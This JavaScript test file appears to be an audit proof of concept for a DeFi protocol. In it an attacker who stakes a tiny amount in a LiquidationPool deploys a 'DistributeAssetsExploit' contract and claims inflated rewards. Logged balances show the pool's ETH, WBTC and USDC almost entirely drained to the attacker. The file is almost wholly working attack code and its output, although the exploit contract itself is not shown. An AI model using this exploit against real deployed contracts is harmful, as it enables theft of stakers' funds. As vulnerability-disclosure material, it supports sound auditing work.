describe('EXPLOIT', async () => {
    it('Exploits Liquidation Pool and get all the rewards', async () => {
      const attacker = holder3;
      const ethCollateral = ethers.utils.parseEther('0.5');
      const wbtcCollateral = BigNumber.from(1_000_000);
      const usdcCollateral = BigNumber.from(500_000_000);
      // create some funds to be "liquidated"
      await holder5.sendTransaction({to: SmartVaultManager.address, value: ethCollateral});
      await WBTC.mint(SmartVaultManager.address, wbtcCollateral);
      await USDC.mint(SmartVaultManager.address, usdcCollateral);

      // holder1 stakes some funds
      const tstStake1 = ethers.utils.parseEther('1000');
      const eurosStake1 = ethers.utils.parseEther('2000');
      await TST.mint(holder1.address, tstStake1);
      await EUROs.mint(holder1.address, eurosStake1);
      await TST.connect(holder1).approve(LiquidationPool.address, tstStake1);
      await EUROs.connect(holder1).approve(LiquidationPool.address, eurosStake1);
      await LiquidationPool.connect(holder1).increasePosition(tstStake1, eurosStake1)

      // holder2 stakes some funds
      const tstStake2 = ethers.utils.parseEther('4000');
      const eurosStake2 = ethers.utils.parseEther('3000');
      await TST.mint(holder2.address, tstStake2);
      await EUROs.mint(holder2.address, eurosStake2);
      await TST.connect(holder2).approve(LiquidationPool.address, tstStake2);
      await EUROs.connect(holder2).approve(LiquidationPool.address, eurosStake2);
      await LiquidationPool.connect(holder2).increasePosition(tstStake2, eurosStake2);

      // attacker stakes a tiny bit of funds
      const tstStake3 = ethers.utils.parseEther('1');
      const eurosStake3 = ethers.utils.parseEther('1');
      await TST.mint(attacker.address, tstStake3);
      await EUROs.mint(attacker.address, eurosStake3);
      await TST.connect(attacker).approve(LiquidationPool.address, tstStake3);
      await EUROs.connect(attacker).approve(LiquidationPool.address, eurosStake3);
      await LiquidationPool.connect(attacker).increasePosition(tstStake3, eurosStake3);

      await fastForward(DAY);
      
      // Some liquidation happens
      await expect(LiquidationPoolManager.runLiquidation(TOKEN_ID)).not.to.be.reverted;

      // staker 1 has 1000 stake value
      // staker 2 has 3000 stake value
      // attacker has 1 stake value
      // ~25% should go to staker 1, ~75% to staker 2, ~0% should go to attacker
      
      // EPLOIT STARTS HERE
      console.log("[Before exploit] Attacker balance:");                           // [Before exploit] Attacker balance:
      console.log("ETH = %s", await ethers.provider.getBalance(attacker.address)); // ETH = 9999999683015393765405
      console.log("WBTC = %s", await WBTC.balanceOf(attacker.address));            // WBTC = 0
      console.log("USDC = %s", await USDC.balanceOf(attacker.address));            // USDC = 0
      console.log("[Before exploit] LiquidationPool balance:");                           // [Before exploit] LiquidationPool balance:
      console.log("ETH = %s", await ethers.provider.getBalance(LiquidationPool.address)); // ETH = 499999999999999999
      console.log("WBTC = %s", await WBTC.balanceOf(LiquidationPool.address));            // WBTC = 999998
      console.log("USDC = %s", await USDC.balanceOf(LiquidationPool.address));            //USDC = 499999998

      // First claim to reset the rewards of the attacker and make calculations easier
      await LiquidationPool.connect(attacker).claimRewards();
      // Deploy exploit contract and execute attack
      let ExploitFactory = await ethers.getContractFactory('DistributeAssetsExploit');
      let ExploitContract = await ExploitFactory.connect(attacker).deploy(LiquidationPool.address);
      await ExploitContract.connect(attacker).exploit(
        attacker.address, WBTC.address, USDC.address
      );
      // Claim inflated rewards to drain the pool
      await LiquidationPool.connect(attacker).claimRewards();

      console.log("\n\n[After exploit] Attacker balance:");                        // [After exploit] Attacker balance:
      console.log("ETH = %s", await ethers.provider.getBalance(attacker.address)); // ETH = 10000497924381243468675
      console.log("WBTC = %s", await WBTC.balanceOf(attacker.address));            // WBTC = 999997
      console.log("USDC = %s", await USDC.balanceOf(attacker.address));            // USDC = 499999997
      console.log("[After exploit] LiquidationPool balance:");                            // [After exploit] LiquidationPool balance:
      console.log("ETH = %s", await ethers.provider.getBalance(LiquidationPool.address)); // ETH = 1
      console.log("WBTC = %s", await WBTC.balanceOf(LiquidationPool.address));            // WBTC = 1
      console.log("USDC = %s", await USDC.balanceOf(LiquidationPool.address));            //USDC = 1
    });
  });